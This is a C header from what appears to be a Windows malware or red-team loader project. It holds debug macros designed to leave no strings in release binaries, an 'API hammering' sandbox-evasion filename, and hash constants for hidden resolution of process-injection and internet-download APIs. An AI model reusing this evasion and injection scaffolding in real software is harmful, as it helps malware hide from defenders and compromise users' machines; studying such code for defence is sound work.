/*
 *  ~ base.h ~
 * Common macros and debugging helpers
 * Author: jakobfriedl
 */

#pragma once
#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#include "structs.h"
#include "typedefs.h"

// If the following line is set, verbose debug messages are printed to the console windows
#define VERBOSE

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifdef VERBOSE
// The following macros can be used to display debugging information. 
// The messages are only shown if DEBUG mode is enabled.

// Replacing printf
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

// Replacing wprintf
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

#define OKAY(MSG, ...) PRINTA("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) PRINTW(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) PRINTA("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) PRINTW(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) PRINTA("[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) PRINTW(L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        PRINTA("[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",    \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        PRINTA("[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n",  \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

#endif 

#ifndef VERBOSE
// The following macros will be deleted by the preprocessor, since they include no code. 
// This enables the use of the macros in debug mode, but they will not contain strings that are visible in the binary.

#define OKAY(MSG, ...) 
#define OKAY_W(MSG, ...)
#define INFO(MSG, ...)
#define INFO_W(MSG, ...)
#define WARN(MSG, ...) 
#define WARN_W(MSG, ...) 
#define PRINT_ERROR(FUNCTION_NAME)                                        
#define PRINT_NTERROR(FUNCTION_NAME)                                       

#endif

#define API_HAMMERING_TMPFILENAME L"data.tmp"

// Hashing
#define HASHA(STRING) (HashFNV_1a((PCHAR)STRING))
#define HASHW(STRING) (HashFNV_1aW((PWCHAR)STRING))

// API and String Hashes
#define NtQuerySystemInformation_HASH 0xAD6597C0
#define NtOpenProcess_HASH 0x3086694A

#define NtCreateSection_HASH 0x9E2DB1B8
#define NtMapViewOfSection_HASH 0x4C4F0668
#define NtUnmapViewOfSection_HASH 0x691F60BB
#define NtCreateThreadEx_HASH 0x3E5547E0
#define NtWaitForSingleObject_HASH 0x72B15F58
#define NtClose_HASH 0xB5C0CBE7

#define NtQueryInformationProcess_HASH 0x992108C8
#define NtCreateFile_HASH 0xC6D9E7BF
#define NtSetInformationFile_HASH 0xE0C616ED
#define NtReadFile_HASH 0xEB5B862F
#define NtWriteFile_HASH 0xED6FE106

#define wininetdll_HASH 0x114D589B
#define kernel32dll_HASH 0x7398B631
#define LoadLibraryA_HASH 0xF88AEB45
#define InternetOpenW_HASH 0x2546657B
#define InternetOpenUrlW_HASH 0x55C3E2D8
#define InternetReadFile_HASH 0xC1BA3520
#define InternetCloseHandle_HASH 0x60F1AD44
#define InternetSetOptionW_HASH 0x38EF2EC4